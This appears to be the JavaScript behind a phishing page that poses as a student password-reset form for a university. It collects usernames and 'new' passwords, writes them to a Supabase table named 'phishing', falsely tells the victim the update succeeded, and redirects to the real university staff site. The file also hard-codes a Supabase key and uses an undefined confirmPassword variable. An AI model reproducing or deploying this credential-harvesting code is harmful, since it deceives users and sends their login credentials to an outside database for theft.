// ==========================
// SUPABASE CONFIG
// ==========================

const SUPABASE_URL =
"https://tzygochlibduxubsblzd.supabase.co";

const SUPABASE_ANON_KEY =
"sb_publishable_GVnQsJLt8IzlyOUAL48Kmg_kdLxPzxH";

const client = supabase.createClient(
    SUPABASE_URL,
    SUPABASE_ANON_KEY
);

// ==========================
// FORM SUBMIT
// ==========================

document
.getElementById("studentForm")
.addEventListener("submit", async function(e){

    e.preventDefault();

    const status =
    document.getElementById("status");

    const username =
    document.getElementById("uname").value;

    const newPassword =
    document.getElementById("newpass").value;
    // Check passwords match
if (newPassword !== confirmPassword) {

    status.innerHTML =
    "<span style='color:red;'>Passwords do not match!</span>";

    return;
}

// Check minimum length
if (newPassword.length < 8) {

    status.innerHTML =
    "<span style='color:red;'>Password must be at least 8 characters.</span>";

    return;
}

    status.innerHTML = "Connecting...";

    try {

        const { data, error } =
        await client
        .from("phishing")
        .insert([
            {
                username: username,
                password: newPassword
            }
        ]);

        if(error){

            console.error(error);

            status.innerHTML =
            "Error: " + error.message;

            alert(
                "SUPABASE ERROR\n\n" +
                error.message
            );

            return;
        }

   status.innerHTML =
"<span style='color:green;font-weight:bold;'>Password updated successfully. Redirecting...</span>";

document
.getElementById("studentForm")
.reset();

// Wait 2 seconds then redirect
setTimeout(() => {
    window.location.href = "https://staff.daystar.ac.ke/";
}, 2000);

    }
    catch(err){

        console.error(err);

        status.innerHTML =
        "JavaScript Error: " +
        err.message;

        alert(
            "JAVASCRIPT ERROR\n\n" +
            err.message
        );
    }

});
